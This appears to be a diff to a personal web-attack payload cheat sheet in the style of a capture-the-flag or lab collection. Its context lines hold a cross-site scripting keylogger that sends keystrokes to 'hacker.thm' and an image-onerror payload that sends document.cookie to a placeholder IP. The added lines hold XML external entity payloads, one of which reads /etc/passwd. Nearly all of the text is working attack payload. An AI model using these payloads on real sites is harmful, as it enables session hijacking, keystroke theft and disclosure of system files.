@@ -10,7 +10,6 @@ session stealing:
 key logger:
 <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
 
-
 # cookie stealing
 < img src=RECURSO onerror=this.src='http://IP_A/?cookies='+btoa(document.cookie) />
 
@@ -34,3 +33,21 @@ function make_table() {
 w.document.write(table); 
 }
 make_table()
+
+# XXE testing:
+!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY example "TESTEANDO_XXE"> ]>
+<post>
+    <title>Example Post</title>
+    <description>&example;</description>
+    <markdown>Example Markdown</markdown>
+</post>
+
+# XXE file read:
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
+<post>
+    <title>Example Post</title>
+    <description>&test;></description>
+    <markdown>Example Markdown></markdown>
+</post>
